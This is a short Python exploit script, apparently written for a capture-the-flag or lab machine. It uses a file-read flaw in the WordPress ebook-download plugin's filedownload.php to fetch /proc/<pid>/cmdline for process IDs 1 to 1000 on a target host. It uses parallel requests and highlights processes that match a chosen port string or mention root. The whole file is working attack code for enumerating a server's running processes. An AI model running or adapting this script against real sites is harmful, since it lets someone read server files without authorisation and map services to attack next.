import requests
from multiprocessing import Pool

def sinper(argu):
    # url change
    url = "http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/" + str(argu) + "/cmdline"
    
    headers={"content-type":"text"}
    resp = requests.get(url,headers=headers)
    leno=len(resp.text)

    target = '1337' # <--- Change

    if (leno > 70):
        if target in resp.text:
            print("\033[33m*** Found *** \n",leno,resp.text)
        elif 'root' in resp.text:
            print("\033[31m*** Root *** \n",leno,resp.text)
        else:
            print("\033[0m"+str(leno),resp.text)

    return 0

def main():
    
    left_limit = 1
    right_limit = 1001 
    # change

    multi_arr = [i for i in range(left_limit,right_limit)]

    with Pool() as p:
        p.map(sinper,multi_arr) 

if __name__ == "__main__":
    main()